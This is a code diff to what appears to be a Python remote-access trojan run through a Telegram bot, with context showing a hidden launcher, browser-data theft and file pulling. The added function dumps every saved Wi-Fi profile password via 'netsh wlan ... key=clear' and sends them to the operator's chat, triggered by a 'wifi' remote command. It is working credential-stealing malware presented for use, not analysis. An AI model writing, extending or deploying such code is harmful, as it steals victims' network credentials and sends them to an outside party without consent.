@@ -384,6 +384,24 @@ sh.Run "{pth}\\upd.bat", 0'''
         except Exception as e:
             logger.log(self.browser.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
+    def extract_wifi_passwords(self):
+        otv = ''
+        try:
+            profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
+            profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
+            
+            for profile in profiles:
+                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('utf-8').split('\n')
+
+                try:
+                    password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i][0]
+                except IndexError:
+                    password = None
+                otv += f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
+            bot.send_message(self.id, f'🖥✅\n{otv}')
+        except Exception as e:
+            logger.log(self.extract_wifi_passwords.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def perfor(self, text, id_chat):
         self.id = id_chat
@@ -455,6 +473,9 @@ sh.Run "{pth}\\upd.bat", 0'''
 
             if comnd == "pull" or comnd == "pull_file":
                 self.pull_file(text_comand[0])
+
+            if comnd == "wifi" or comnd == "extract_wifi_passwords":
+                self.extract_wifi_passwords()
 
             if comnd == "kill":
                 self.exits()
